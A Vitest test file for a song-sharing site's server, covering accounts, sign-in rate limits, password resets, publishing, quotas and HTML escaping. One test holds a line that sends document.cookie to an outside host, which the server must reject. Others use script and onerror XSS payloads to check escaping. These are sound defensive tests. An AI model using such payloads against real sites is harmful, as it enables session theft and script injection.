import { createHmac } from 'node:crypto'
import { mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { request } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { createSite, type Site, type SiteOptions } from '../../server/site'
import { writeSongFile, type SongFile } from '../../src/library/songfile'

let site: Site
let dataDir: string
let clock = 1_700_000_000_000

const PASSWORD = 'a long enough one'
const OTHER = 'another one entirely'
const QUARTER = 16 * 60 * 1000

const start = async (more: Partial<SiteOptions> = {}) => (site = await createSite({ port: 0, dataDir, now: () => clock, codesShown: true, ...more }))
const ask = (path: string, init: RequestInit & { token?: string; json?: unknown } = {}) =>
    fetch(site.origin + path, {
        ...init,
        ...(init.json === undefined ? {} : { method: init.method ?? 'POST', body: JSON.stringify(init.json) }),
        headers: { ...(init.json === undefined ? {} : { 'Content-Type': 'application/json' }), ...(init.token ? { Authorization: `Bearer ${init.token}` } : {}), ...init.headers },
    })
const told = async (answer: Promise<Response>) => {
    const got = await answer
    return [got.status, await got.json()]
}

const register = (email = 'ante@example.com', name = 'Ante', password = PASSWORD) => ask('/api/register', { json: { email, password, name } })
const signIn = async (email = 'ante@example.com', name = 'Ante'): Promise<string> => (await (await register(email, name)).json()).token
const enter = (email: string, password: string) => ask('/api/sign-in', { json: { email, password } })
const kept = () => JSON.parse(readFileSync(join(dataDir, 'site.json'), 'utf8'))

const mp3 = (bytes = 2000) => Buffer.from(Uint8Array.from({ length: bytes }, (_, at) => (at === 0 ? 0xff : at === 1 ? 0xfb : 0))).toString('base64')
const wav = (bytes = 64) => {
    const data = new Uint8Array(bytes)
    data.set([...'RIFF'].map((letter) => letter.charCodeAt(0)), 0)
    data.set([...'WAVE'].map((letter) => letter.charCodeAt(0)), 8)
    return data
}
const song = (parts: Partial<SongFile> = {}) => writeSongFile({ name: 'Slow burn', code: 'setcpm(84/4)\n\ndrums: s("bd*4")\nvoc: s("take")\n', keys: {}, sounds: [{ name: 'take', file: 'take.wav', type: 'audio/wav', seconds: 1, data: wav() }], ...parts })
const publish = (token: string, more: Record<string, unknown> = {}) => ask('/api/songs', { token, json: { file: song(), preview: mp3(), description: 'Slow.', style: 'trip hop', licence: 'CC BY 4.0', previewFrom: 8, ...more } })

beforeEach(async () => {
    dataDir = mkdtempSync(join(tmpdir(), 'weft-site-'))
    await start()
})

afterEach(async () => {
    await site.close()
    vi.useRealTimers()
    rmSync(dataDir, { recursive: true, force: true })
})

describe('accounts', () => {
    it('are made in the app, with an address, a password and a name', async () => {
        const made = await register(' Ante@Example.com ', 'Ante')
        expect(made.status).toBe(201)
        const { token, ...rest } = await made.json()
        expect(rest).toEqual({ name: 'Ante', email: 'ante@example.com' })
        expect(await (await ask('/api/me', { token })).json()).toEqual({ name: 'Ante', email: 'ante@example.com', used: 0, most: 10 })
    })

    it('are refused without an address, a password of eight characters or a name, and when the address is taken', async () => {
        const refused = (json: Record<string, unknown>) => told(ask('/api/register', { json }))
        expect(await refused({ email: 'nobody', password: PASSWORD, name: 'Ante' })).toMatchObject([400, { why: 'email' }])
        expect(await refused({ email: 'ante@example.com', password: 'short', name: 'Ante' })).toEqual([400, { why: 'password', what: 'A password needs at least 8 characters.' }])
        expect(await refused({ email: 'ante@example.com', name: 'Ante' })).toMatchObject([400, { why: 'password' }])
        expect(await refused({ email: 'ante@example.com', password: 'x'.repeat(201), name: 'Ante' })).toMatchObject([400, { why: 'password' }])
        expect(await refused({ email: 'ante@example.com', password: PASSWORD, name: '  ' })).toEqual([400, { why: 'name', what: 'Type the name that should stand beside your songs.' }])
        expect(await refused({ email: 'ante@example.com', password: PASSWORD, name: 'x'.repeat(25) })).toMatchObject([400, { why: 'name' }])
        expect(readdirSync(dataDir)).not.toContain('site.json')
        expect((await register()).status).toBe(201)
        expect(await refused({ email: 'ANTE@example.com', password: OTHER, name: 'Other' })).toEqual([409, { why: 'taken', what: 'There is already an account with this email. Sign in instead.' }])
        expect(kept().people).toHaveLength(1)
    })

    it('are not made faster than ten from one place in a quarter of an hour', async () => {
        let last = 0
        for (let count = 0; count < 11; count++) last = (await register(`p${count}@example.com`, 'Someone')).status
        expect(last).toBe(429)
        expect(kept().people).toHaveLength(10)
        clock += QUARTER
        expect((await register('late@example.com', 'Late')).status).toBe(201)
    })

    it('keep a password only as what scrypt made of it, different for two people with the same one', async () => {
        await register('ante@example.com', 'Ante')
        await register('mara@example.com', 'Mara')
        const [ante, mara] = kept().people
        expect(ante.password).toMatch(/^scrypt\$32768\$8\$1\$[\w-]{22}\$[\w-]{43}$/)
        expect(mara.password).toMatch(/^scrypt\$32768\$8\$1\$/)
        expect(ante.password).not.toBe(mara.password)
        expect(readFileSync(join(dataDir, 'site.json'), 'utf8')).not.toContain(PASSWORD)
    })

    it('change the name that stands beside their songs', async () => {
        const token = await signIn()
        const made = await (await publish(token)).json()
        expect(await told(ask('/api/me', { token, json: { name: '  Ante   L. ' } }))).toEqual([200, { name: 'Ante L.', email: 'ante@example.com', used: 1, most: 10 }])
        expect((await (await ask('/api/songs')).json()).songs[0].by).toBe('Ante L.')
        expect(await told(ask('/api/me', { token, json: { name: ' ' } }))).toMatchObject([400, { why: 'name' }])
        expect(await told(ask('/api/me', { token, json: { name: 'x'.repeat(25) } }))).toMatchObject([400, { why: 'name' }])
        expect((await ask('/api/me', { json: { name: 'Nobody' } })).status).toBe(401)
        expect(await (await fetch(made.url)).text()).toContain('Ante L.')
    })

    it('are not needed to be told what a call needs: who says a machine its address, and a pass for the carrier that runs out', async () => {
        expect(await told(ask('/api/ice'))).toEqual([200, { iceServers: [] }])
        await site.close()
        await start({ ice: { stun: ['stun:weftloom.dev:3478'], turn: { urls: ['turn:weftloom.dev:3479?transport=udp'], secret: 'a shared secret', hours: 12 } } })
        const [status, body] = await told(ask('/api/ice'))
        expect(status).toBe(200)
        expect(body.iceServers[0]).toEqual({ urls: ['stun:weftloom.dev:3478'] })
        const pass = body.iceServers[1]
        expect(pass.urls).toEqual(['turn:weftloom.dev:3479?transport=udp'])
        const [until] = pass.username.split(':')
        expect(Number(until)).toBe(Math.floor(clock / 1000) + 12 * 3600)
        expect(pass.credential).toBe(createHmac('sha1', 'a shared secret').update(pass.username).digest('base64'))
        expect(JSON.stringify(body)).not.toContain('a shared secret')
        const again = (await told(ask('/api/ice')))[1].iceServers[1]
        expect(again.username).not.toBe(pass.username)
        let last = 0
        for (let asks = 0; asks < 40; asks++) last = (await ask('/api/ice')).status
        expect(last).toBe(429)
    })

    it('are deleted with their sessions, songs and files, by whoever knows the password', async () => {
        const token = await signIn()
        const second = (await (await enter('ante@example.com', PASSWORD)).json()).token
        const made = await (await publish(token)).json()
        await publish(token)
        const others = await (await publish(await signIn('mara@example.com', 'Mara'))).json()
        expect(readdirSync(join(dataDir, 'songs'))).toHaveLength(6)
        expect(await told(ask('/api/me', { token, method: 'DELETE', json: { password: 'not the password' } }))).toMatchObject([401, { why: 'wrong' }])
        expect((await ask('/api/me', { method: 'DELETE', json: { password: PASSWORD } })).status).toBe(401)
        expect(readdirSync(join(dataDir, 'songs'))).toHaveLength(6)
        expect(await told(ask('/api/me', { token, method: 'DELETE', json: { password: PASSWORD } }))).toEqual([200, {}])
        expect(readdirSync(join(dataDir, 'songs')).sort()).toEqual([`${others.id}.mp3`, `${others.id}.weft`])
        expect((await ask('/api/me', { token })).status).toBe(401)
        expect((await ask('/api/me', { token: second })).status).toBe(401)
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(401)
        expect((await fetch(made.url)).status).toBe(404)
        expect((await (await ask('/api/songs')).json()).songs.map((one: { id: string }) => one.id)).toEqual([others.id])
        expect(kept().people.map((one: { email: string }) => one.email)).toEqual(['mara@example.com'])
        expect((await register()).status).toBe(201)
    })
})

describe('signing in', () => {
    it('takes the address and the password, and hands back what the app holds from then on', async () => {
        await register()
        const answer = await enter('Ante@Example.com', PASSWORD)
        expect(answer.status).toBe(200)
        const { token, ...rest } = await answer.json()
        expect(rest).toEqual({ name: 'Ante', email: 'ante@example.com' })
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ name: 'Ante', used: 0 })
    })

    it('says the same whichever of the two is wrong, and hands nothing out', async () => {
        await register()
        const tried = (json: Record<string, unknown>) => told(ask('/api/sign-in', { json }))
        const wrong = [401, { why: 'wrong', what: 'The email or the password is not right.' }]
        expect(await tried({ email: 'ante@example.com', password: 'not the password' })).toEqual(wrong)
        expect(await tried({ email: 'nobody@example.com', password: PASSWORD })).toEqual(wrong)
        expect(await tried({ email: 'not an address', password: PASSWORD })).toEqual(wrong)
        expect(await tried({ email: 'ante@example.com' })).toEqual(wrong)
        expect(await tried({ email: 'ante@example.com', name: 'Ante' })).toEqual(wrong)
        expect(await tried({ email: 'ante@example.com', password: PASSWORD + 'x'.repeat(200) })).toEqual(wrong)
    })

    it('takes ten tries in a quarter of an hour and no more, from one place or for one address', async () => {
        await register()
        let last = 0
        for (let tries = 0; tries < 11; tries++) last = (await enter(`p${tries}@example.com`, 'not the password')).status
        expect(last).toBe(429)
        expect(await told(enter('ante@example.com', PASSWORD))).toEqual([429, { why: 'wait', what: 'Too many tries. Wait a quarter of an hour and try again.' }])
        clock += QUARTER
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(200)
    })

    it('is needed for everything that is a person\'s own', async () => {
        expect((await ask('/api/me')).status).toBe(401)
        expect((await publish('wrong')).status).toBe(401)
        expect((await ask('/api/songs?mine')).status).toBe(401)
        expect((await ask('/api/password', { token: 'wrong', json: { old: PASSWORD, new: OTHER } })).status).toBe(401)
        const token = await signIn()
        await ask('/api/sign-out', { token, method: 'POST' })
        expect((await ask('/api/me', { token })).status).toBe(401)
    })

    it('no longer waits for a link to be pressed', async () => {
        expect((await ask('/api/sign-in/poll', { json: { id: 'x', secret: 'y' } })).status).toBe(404)
        expect((await fetch(`${site.origin}/sign-in/confirm?token=x`)).status).toBe(404)
        expect((await fetch(`${site.origin}/sign-in/confirm`, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'token=x' })).status).toBe(404)
    })
})

describe('a password', () => {
    it('is changed with the old one, which keeps this session and ends the others', async () => {
        const first = await signIn()
        const second = (await (await enter('ante@example.com', PASSWORD)).json()).token
        expect(await told(ask('/api/password', { token: first, json: { old: 'not the password', new: OTHER } }))).toMatchObject([401, { why: 'wrong' }])
        expect(await told(ask('/api/password', { token: first, json: { old: PASSWORD, new: 'short' } }))).toMatchObject([400, { why: 'password' }])
        expect((await ask('/api/me', { token: second })).status).toBe(200)
        expect((await ask('/api/password', { token: first, json: { old: PASSWORD, new: OTHER } })).status).toBe(200)
        expect((await ask('/api/me', { token: first })).status).toBe(200)
        expect((await ask('/api/me', { token: second })).status).toBe(401)
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(401)
        expect((await enter('ante@example.com', OTHER)).status).toBe(200)
    })

    it('that is forgotten cannot be replaced where the site sends no mail and was not told to show codes, for any email alike', async () => {
        await signIn()
        await site.close()
        await start({ codesShown: false })
        const refused = [503, { why: 'mail', what: 'This site cannot send mail yet, so it cannot send a code for a new password. Sign in with the password you have.' }]
        expect(await told(ask('/api/password/forgot', { json: { email: 'ante@example.com' } }))).toEqual(refused)
        expect(await told(ask('/api/password/forgot', { json: { email: 'nobody@example.com' } }))).toEqual(refused)
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(200)
    })

    it('that is forgotten is mailed its code where the site has a way to send mail, and the code is not in the answer', async () => {
        await signIn()
        await site.close()
        const sent: string[][] = []
        await start({ codesShown: false, mail: (to, code) => void sent.push([to, code]) })
        expect(await told(ask('/api/password/forgot', { json: { email: 'ante@example.com' } }))).toEqual([200, {}])
        expect(sent).toEqual([['ante@example.com', expect.stringMatching(/^[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{8}$/)]])
        expect((await ask('/api/password/reset', { json: { email: 'ante@example.com', code: sent[0][1], password: OTHER } })).status).toBe(200)
        expect((await enter('ante@example.com', OTHER)).status).toBe(200)
    })

    it('counts tries by the address the web server in front noted, and only where it is said that there is one', async () => {
        await signIn()
        const tries = async (from: string) => {
            let last = 0
            for (let count = 0; count < 11; count++) last = (await ask('/api/sign-in', { json: { email: `p${count}-${from}@example.com`, password: 'not the password' }, headers: { 'X-Real-IP': from } })).status
            return last
        }
        expect(await tries('203.0.113.7')).toBe(429)
        await site.close()
        await start({ behindProxy: true })
        expect(await tries('203.0.113.7')).toBe(429)
        expect((await ask('/api/sign-in', { json: { email: 'someone@example.com', password: 'not the password' }, headers: { 'X-Real-IP': '203.0.113.8' } })).status).toBe(401)
    })

    it('that is forgotten is chosen anew with a code, which this machine hands back because it sends no mail', async () => {
        const token = await signIn()
        const asked = await told(ask('/api/password/forgot', { json: { email: 'Ante@Example.com' } }))
        expect(asked).toEqual([200, { code: expect.stringMatching(/^[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{8}$/) }])
        const { code } = asked[1]
        const wrong = [400, { why: 'code', what: 'That code is not right, or it has run out. Ask for a new one.' }]
        const reset = (more: Record<string, unknown>) => told(ask('/api/password/reset', { json: { email: 'ante@example.com', code, password: OTHER, ...more } }))
        expect(await reset({ password: 'short' })).toEqual([400, { why: 'password', what: 'A password needs at least 8 characters.' }])
        expect(await reset({ code: code === 'AAAAAAAA' ? 'BBBBBBBB' : 'AAAAAAAA' })).toEqual(wrong)
        expect(await reset({ email: 'mara@example.com' })).toEqual(wrong)
        expect((await ask('/api/me', { token })).status).toBe(200)
        const [status, made] = await reset({ code: ` ${code.slice(0, 4).toLowerCase()}-${code.slice(4)} ` })
        expect([status, made]).toEqual([200, { token: expect.any(String), name: 'Ante', email: 'ante@example.com' }])
        expect((await ask('/api/me', { token: made.token })).status).toBe(200)
        expect((await ask('/api/me', { token })).status).toBe(401)
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(401)
        expect((await enter('ante@example.com', OTHER)).status).toBe(200)
        expect(await reset({ password: 'a third one, why not' })).toEqual(wrong)
    })

    it('cannot be chosen with a code that ran out, or after five wrong tries at it', async () => {
        await register()
        const wrong = [400, { why: 'code', what: 'That code is not right, or it has run out. Ask for a new one.' }]
        const reset = (code: string) => told(ask('/api/password/reset', { json: { email: 'ante@example.com', code, password: OTHER } }))
        const late = (await (await ask('/api/password/forgot', { json: { email: 'ante@example.com' } })).json()).code
        clock += QUARTER
        expect(await reset(late)).toEqual(wrong)
        const { code } = await (await ask('/api/password/forgot', { json: { email: 'ante@example.com' } })).json()
        expect(code).not.toBe(late)
        for (let tries = 0; tries < 5; tries++) expect(await reset(code === 'AAAAAAAA' ? 'BBBBBBBB' : 'AAAAAAAA')).toEqual(wrong)
        expect(await reset(code)).toEqual(wrong)
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(200)
    })

    it('code is sent by mail when there is a way to, and then the answer never says whether there is such an account', async () => {
        await site.close()
        const sent: string[][] = []
        await start({ mail: (to, code) => void sent.push([to, code]) })
        await register('mara@example.com', 'Mara')
        expect(await told(ask('/api/password/forgot', { json: { email: 'mara@example.com' } }))).toEqual([200, {}])
        expect(await told(ask('/api/password/forgot', { json: { email: 'nobody@example.com' } }))).toEqual([200, {}])
        expect(sent).toEqual([['mara@example.com', expect.stringMatching(/^[A-Z2-9]{8}$/)]])
        expect((await ask('/api/password/reset', { json: { email: 'mara@example.com', code: sent[0][1], password: OTHER } })).status).toBe(200)
    })

    it('code is not asked for, or tried, more than ten times in a quarter of an hour', async () => {
        expect((await ask('/api/password/forgot', { json: { email: 'nobody' } })).status).toBe(400)
        let last = 200
        for (let asks = 0; asks < 11; asks++) last = (await ask('/api/password/forgot', { json: { email: `p${asks}@example.com` } })).status
        expect(last).toBe(429)
        for (let tries = 0; tries < 11; tries++) last = (await ask('/api/password/reset', { json: { email: `p${tries}@example.com`, code: 'AAAAAAAA', password: OTHER } })).status
        expect(last).toBe(429)
    })
})

describe('publishing', () => {
    it('keeps the song, hands the file back as it came with where it is from, and lists it', async () => {
        const token = await signIn()
        const answer = await publish(token)
        expect(answer.status).toBe(201)
        const made = await answer.json()
        expect(made).toMatchObject({ name: 'Slow burn', by: 'Ante', description: 'Slow.', style: 'trip hop', licence: 'CC BY 4.0', tempo: 84, patterns: ['drums', 'voc'], previewFrom: 8, hidden: false, published: clock, plays: 0, downloads: 0, bytes: song().length, url: `${site.origin}/songs/${made.id}` })
        const file = await fetch(made.file)
        expect(file.headers.get('content-disposition')).toBe('attachment; filename="Slow burn.weft"')
        expect(file.headers.get('x-content-type-options')).toBe('nosniff')
        const { source, ...sent } = JSON.parse(await file.text())
        expect(source).toEqual({ id: made.id, name: 'Slow burn', by: 'Ante' })
        expect(JSON.stringify(sent)).toBe(song())
        expect(readFileSync(join(dataDir, 'songs', `${made.id}.weft`), 'utf8')).toBe(song())
        const preview = await fetch(made.preview)
        expect(preview.headers.get('content-type')).toBe('audio/mpeg')
        expect((await preview.arrayBuffer()).byteLength).toBe(2000)
        const listed = await (await ask('/api/songs')).json()
        expect(listed.songs.map((one: { name: string; downloads: number; plays: number }) => [one.name, one.downloads, one.plays])).toEqual([['Slow burn', 1, 1]])
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ used: 1, most: 10 })
    })

    it('checks every file itself, and refuses code that is more than music with its line', async () => {
        const token = await signIn()
        const bad = await publish(token, { file: song({ code: 'voc: s("take")\nfetch("https://example.com/" + document.cookie)' }) })
        expect(bad.status).toBe(422)
        expect(await bad.json()).toEqual({ why: 'code', what: 'fetch is not something a song can use', line: 2 })
        expect((await publish(token, { file: 'not a song' })).status).toBe(422)
        const page = Uint8Array.from([...'<script>alert(1)</script>'].map((letter) => letter.charCodeAt(0)))
        expect(await (await publish(token, { file: song({ sounds: [{ name: 'take', file: 'take.wav', type: 'audio/wav', seconds: 1, data: page }] }) })).json()).toMatchObject({ why: 'sound' })
        expect(await (await publish(token, { file: song({ sounds: [{ name: 'take', file: 'take.wav', type: 'audio/wav', seconds: 1, data: wav(900 * 1024) }] }) })).json()).toMatchObject({ why: 'size' })
        expect(readdirSync(join(dataDir, 'songs'))).toEqual([])
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ used: 0 })
    })

    it('wants a preview that is sound, and a licence', async () => {
        const token = await signIn()
        expect(await (await publish(token, { preview: '' })).json()).toMatchObject({ why: 'preview' })
        expect(await (await publish(token, { preview: Buffer.from('<html>').toString('base64') })).json()).toMatchObject({ why: 'preview' })
        expect(await (await publish(token, { preview: mp3(800 * 1024) })).json()).toMatchObject({ why: 'preview' })
        expect(await (await publish(token, { licence: 'mine' })).json()).toMatchObject({ why: 'licence' })
    })

    it('keeps how loud the preview is and how long, and leaves out what is not that', async () => {
        const token = await signIn()
        const peaks = Array.from({ length: 160 }, (_, at) => (at % 10) / 10)
        expect(await (await publish(token, { peaks, seconds: 29.96 })).json()).toMatchObject({ peaks, seconds: 30 })
        const kept = async (more: Record<string, unknown>) => {
            const made = await (await publish(token, more)).json()
            return [made.peaks, made.seconds]
        }
        expect(await kept({})).toEqual([undefined, undefined])
        expect(await kept({ peaks: [0.5, 1.2], seconds: 32 })).toEqual([undefined, undefined])
        expect(await kept({ peaks: Array(201).fill(0.5), seconds: -1 })).toEqual([undefined, undefined])
        expect(await kept({ peaks: 'loud', seconds: '30' })).toEqual([undefined, undefined])
        expect(await kept({ peaks: [0.123, 0.987], seconds: 31 })).toEqual([[0.12, 0.99], 31])
    })

    it('keeps what a song was made from only when that is a song on the site that everyone can open', async () => {
        const mara = await signIn('mara@example.com', 'Mara')
        const first = await (await publish(mara)).json()
        const hidden = await (await publish(mara)).json()
        await ask(`/api/songs/${hidden.id}/hide`, { token: mara, method: 'POST' })
        const ante = await signIn()
        expect((await (await publish(ante, { from: first.id })).json()).from).toBe(first.id)
        expect((await (await publish(ante, { from: hidden.id })).json()).from).toBeUndefined()
        expect((await (await publish(ante, { from: 'nosuchsong' })).json()).from).toBeUndefined()
        expect((await (await publish(ante, { from: { id: first.id } })).json()).from).toBeUndefined()
        expect((await (await publish(mara, { from: hidden.id })).json()).from).toBeUndefined()
    })

    it('takes ten songs from a person and no more, until one is deleted', async () => {
        const token = await signIn()
        for (let count = 0; count < 10; count++) expect((await publish(token)).status).toBe(201)
        const full = await publish(token)
        expect(full.status).toBe(409)
        expect(await full.json()).toMatchObject({ why: 'full' })
        const { songs } = await (await ask('/api/songs?mine', { token })).json()
        expect(songs).toHaveLength(10)
        expect(await (await ask(`/api/songs/${songs[0].id}`, { token, method: 'DELETE' })).json()).toEqual({ used: 9, most: 10 })
        expect(readdirSync(join(dataDir, 'songs'))).toHaveLength(18)
        expect((await publish(token)).status).toBe(201)
        expect((await publish(await signIn('mara@example.com', 'Mara'))).status).toBe(201)
    })

    it('lets its maker change what is said about a song, within the same limits, and nothing else', async () => {
        const token = await signIn()
        const made = await (await publish(token)).json()
        const edit = (json: Record<string, unknown>, by = token) => told(ask(`/api/songs/${made.id}`, { token: by, json }))
        expect(await edit({ description: `  A new\n one. ${'x'.repeat(600)}`, style: 's'.repeat(40), licence: 'CC0', name: 'Other', plays: 99 })).toMatchObject([200, { id: made.id, name: 'Slow burn', description: `A new one. ${'x'.repeat(489)}`, style: 's'.repeat(30), licence: 'CC0', plays: 0, hidden: false, url: made.url }])
        expect(await edit({ licence: 'mine' })).toMatchObject([400, { why: 'licence' }])
        expect(await edit({ style: 'dub' })).toMatchObject([200, { description: `A new one. ${'x'.repeat(489)}`, style: 'dub', licence: 'CC0' }])
        expect(await edit({ description: '' })).toMatchObject([200, { description: '', style: 'dub' }])
        expect(await edit({ style: 'mine now' }, await signIn('mara@example.com', 'Mara'))).toMatchObject([404, { why: 'missing' }])
        expect((await ask(`/api/songs/${made.id}`, { json: { style: 'nobody' } })).status).toBe(401)
        expect((await (await ask('/api/songs?mine', { token })).json()).songs[0]).toMatchObject({ style: 'dub', licence: 'CC0' })
    })

    it('hides a song from everyone else, counts it still, and shows it again', async () => {
        const token = await signIn()
        const made = await (await publish(token)).json()
        await ask(`/api/songs/${made.id}/hide`, { token, method: 'POST' })
        expect((await ask('/api/songs').then((answer) => answer.json())).songs).toEqual([])
        expect((await (await ask('/api/songs?mine', { token })).json()).songs).toMatchObject([{ id: made.id, hidden: true }])
        expect((await fetch(made.url)).status).toBe(404)
        expect((await fetch(made.file)).status).toBe(404)
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ used: 1 })
        await ask(`/api/songs/${made.id}/show`, { token, method: 'POST' })
        expect((await fetch(made.url)).status).toBe(200)
    })

    it('lets nobody touch a song that is not theirs', async () => {
        const made = await (await publish(await signIn())).json()
        const other = await signIn('mara@example.com', 'Mara')
        expect((await ask(`/api/songs/${made.id}`, { token: other, method: 'DELETE' })).status).toBe(404)
        expect((await ask(`/api/songs/${made.id}/hide`, { token: other, method: 'POST' })).status).toBe(404)
        expect((await fetch(made.url)).status).toBe(200)
    })

    it('shows a song on a page with nothing of the maker\'s words left as markup', async () => {
        const token = await signIn('ante@example.com', '<b>Ante</b>')
        const made = await (await publish(token, { file: song({ name: '<img src=x onerror=alert(1)>' }), description: '<script>alert(2)</script>', style: '"><i>' })).json()
        const page = await fetch(made.url)
        const html = await page.text()
        expect(html).not.toContain('<img src=x')
        expect(html).not.toContain('<script>')
        expect(html).not.toContain('<b>Ante</b>')
        expect(html).toContain('&#60;img src=x onerror=alert(1)&#62;')
        expect(page.headers.get('content-security-policy')).toContain("default-src 'none'")
    })

    it('still has everything after it is started again', async () => {
        const token = await signIn()
        const made = await (await publish(token)).json()
        await site.close()
        await start()
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ name: 'Ante', used: 1 })
        expect((await fetch(`${site.origin}/songs/${made.id}.weft`)).status).toBe(200)
        expect((await enter('ante@example.com', PASSWORD)).status).toBe(200)
    })

    it('counts a play or a download at once, and writes the counts on a timer, not for each one', async () => {
        await site.close()
        vi.useFakeTimers({ toFake: ['setInterval', 'clearInterval'] })
        await start()
        const made = await (await publish(await signIn())).json()
        const counts = (songs: { plays: number; downloads: number }[]) => songs.map((one) => [one.plays, one.downloads])
        await fetch(made.preview)
        await fetch(made.preview)
        await fetch(made.file)
        expect(counts((await (await ask('/api/songs')).json()).songs)).toEqual([[2, 1]])
        expect(counts(kept().songs)).toEqual([[0, 0]])
        vi.advanceTimersByTime(30_000)
        expect(counts(kept().songs)).toEqual([[2, 1]])
        // A part of a preview from further in is no play, so the timer finds nothing to write.
        writeFileSync(join(dataDir, 'site.json'), 'as it was left')
        await fetch(made.preview, { headers: { Range: 'bytes=1000-' } })
        vi.advanceTimersByTime(30_000)
        expect(readFileSync(join(dataDir, 'site.json'), 'utf8')).toBe('as it was left')
    })

    it('writes the counts when it is closed, with what it still counts while it closes', async () => {
        const made = await (await publish(await signIn())).json()
        await fetch(made.preview)
        expect(kept().songs[0]).toMatchObject({ plays: 0, downloads: 0 })
        // A download that the site has begun to take when it is told to close.
        const late = request(made.file, { agent: false, headers: { Expect: '100-continue', 'Transfer-Encoding': 'chunked' } })
        await new Promise((taken) => late.once('continue', taken))
        const closed = site.close()
        expect(kept().songs[0]).toMatchObject({ plays: 1, downloads: 0 })
        const answered = new Promise<number | undefined>((done) => late.once('response', (answer) => answer.resume().once('end', () => done(answer.statusCode))))
        late.end()
        expect(await answered).toBe(200)
        await closed
        expect(kept().songs[0]).toMatchObject({ plays: 1, downloads: 1 })
        await start()
        expect((await (await ask('/api/songs')).json()).songs[0]).toMatchObject({ plays: 1, downloads: 1 })
    })

    it('answers the app from where the app runs, and nobody else\'s pages', async () => {
        const mine = await ask('/api/songs', { headers: { Origin: 'tauri://localhost' } })
        expect(mine.headers.get('access-control-allow-origin')).toBe('tauri://localhost')
        const theirs = await ask('/api/songs', { headers: { Origin: 'https://example.com' } })
        expect(theirs.headers.get('access-control-allow-origin')).toBeNull()
        expect((await ask('/api/songs', { method: 'OPTIONS', headers: { Origin: 'http://localhost:5180' } })).status).toBe(204)
    })
})
